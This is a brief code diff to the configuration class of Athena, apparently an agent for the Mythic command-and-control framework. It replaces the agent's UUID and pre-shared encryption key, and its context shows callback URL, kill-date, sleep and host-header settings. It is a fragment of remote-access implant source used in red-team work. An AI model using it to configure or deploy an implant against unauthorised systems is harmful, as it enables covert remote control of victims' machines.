@@ -20,7 +20,7 @@ namespace Athena.Config
 
         public MythicConfig()
         {
-            uuid = "43000379-d938-4ba3-9c6b-2bb288ce3aa3";
+            uuid = "b7d39438-92fb-4d34-b575-f70522de750d";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("1", out sleep) ? sleep : 60;
@@ -56,7 +56,7 @@ namespace Athena.Config
             string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "USER_AGENT";
             this.hostHeader = "%HOSTHEADER%";
-            this.psk = "dwoj2+GZjegX8/om55Q7w2dwqeVY9KMOdkFjAmNwlH8=";
+            this.psk = "UT86M0GNELnqM0fpqRjpGgSj/5LIM7jxjruoPZFqtvk=";
             this.encryptedExchangeCheck = bool.Parse("false");
             if (!string.IsNullOrEmpty(this.psk))
             {
